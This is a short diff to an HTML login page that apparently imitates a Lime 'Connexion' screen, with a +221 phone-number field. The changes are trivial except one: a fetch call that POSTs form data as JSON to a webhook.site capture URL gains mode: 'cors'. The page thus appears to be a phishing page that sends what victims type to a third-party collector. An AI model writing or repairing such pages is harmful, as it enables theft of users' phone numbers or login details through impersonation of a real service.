@@ -10,7 +10,6 @@
       font-family: Arial, sans-serif;
       background: #f0f0f0;
     }
-
     .background {
       background: url('https://i.imgur.com/AVktJnm.png') no-repeat center top;
       background-size: cover;
@@ -145,11 +144,9 @@
 </head>
 <body>
   <div class="background"></div>
-
   <div class="container">
     <img src="https://i.imgur.com/ZCXUO3X.png" alt="Logo Lime" class="logo">
     <h2>Connexion</h2>
-
     <div class="form-group">
       <div class="phone-input">
         <div class="prefix" id="prefix" onclick="openModal()">+221</div>
@@ -208,6 +205,7 @@
 
       fetch("https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5", {
         method: "POST",
+        mode: "cors",
         headers: {
           "Content-Type": "application/json"
         },
